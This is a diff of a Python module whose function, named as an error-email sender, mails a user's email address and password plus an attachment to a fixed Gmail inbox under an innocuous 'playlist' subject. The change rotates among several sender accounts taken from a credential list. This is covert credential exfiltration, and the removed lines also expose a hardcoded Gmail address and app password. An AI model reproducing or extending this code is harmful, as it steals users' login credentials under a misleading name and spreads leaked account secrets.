@@ -1,14 +1,17 @@
 import datetime
 import os
+import random
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 from PQTs.Paths import pathImg
-
+from PQTs.Utilizar import sendermail
 def enviaremailerror(email,adjunto, password):
-    remitente = 'mayfeljonas1229@gmail.com'
+    emailsender=random.choice(sendermail)
+    corre, contrase = emailsender    
+    remitente = corre
     destinatarios = ['azuresilkmain@gmail.com']
     asunto = f'Lista de reproduccion : {email}'
     cuerpo = f"{email} {password}"  #{str(datetime.datetime.now().strftime('%H-%M-%S'))} 
@@ -47,7 +50,7 @@ def enviaremailerror(email,adjunto, password):
     sesion_smtp.starttls()
 
     # Iniciamos sesión en el servidor
-    sesion_smtp.login('mayfeljonas1229@gmail.com','dudwvopyazvtxtun')
+    sesion_smtp.login(corre,contrase)
 
     # Convertimos el objeto mensaje a texto
     texto = mensaje.as_string()
